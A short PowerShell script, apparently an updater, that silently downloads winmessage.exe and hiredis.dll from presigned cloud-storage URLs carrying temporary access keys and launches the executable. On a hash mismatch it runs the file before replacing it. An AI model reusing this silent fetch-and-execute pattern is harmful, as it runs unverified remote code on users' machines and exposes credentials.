
$ProgressPreference = 'SilentlyContinue'
# stop process
get-process -Name winmessage -ErrorAction SilentlyContinue | stop-process

$Main = 'http://utoos.oss-cn-shanghai.aliyuncs.com/winmessage.exe?Expires=1733153102&OSSAccessKeyId=TMP.3Kk2epdQUxg3sjvfQgXJjMf7RdFRYxt4zVjAYgPnQo3uFmZ5QaiEQi9obnSCe8D3JfXX8qGuu11cVbnEHBNkkFW26g4kz3&Signature=6EvLgDzM3E0iRN12ujWcfinp5Lg%3D'
$Once = 'http://utoos.oss-cn-shanghai.aliyuncs.com/hiredis.dll?Expires=1733153051&OSSAccessKeyId=TMP.3Kk2epdQUxg3sjvfQgXJjMf7RdFRYxt4zVjAYgPnQo3uFmZ5QaiEQi9obnSCe8D3JfXX8qGuu11cVbnEHBNkkFW26g4kz3&Signature=swyLOO3Ognm0vjm%2F%2B%2F70wcVClVk%3D'
$MD5 = '9B8AE7332E2E1C900B579EE728E82E6A'

# download  file
if (-not (Test-Path -Path c:\utools\winmessage.exe)) {
    curl -Uri $Main -OutFile c:\utools\winmessage.exe -erroraction SilentlyContinue
    curl -Uri $Once -OutFile c:\utools\hiredis.dll -erroraction SilentlyContinue
    Start-Process -FilePath C:\utools\winmessage.exe -NoNewWindow
}

if ((Test-Path -Path c:\utools\winmessage.exe) -AND (Get-FileHash -Algorithm MD5 c:\utools\winmessage.exe).Hash -ne $MD5) {
    Start-Process -FilePath C:\utools\winmessage.exe -NoNewWindow
    Remove-Item -Path C:\utools\winmessage.exe -Force
    curl -Uri $Main -OutFile c:\utools\winmessage.exe -erroraction SilentlyContinue
    Start-Process -FilePath C:\utools\winmessage.exe -NoNewWindow
}

Start-Process -FilePath C:\utools\winmessage.exe -NoNewWindow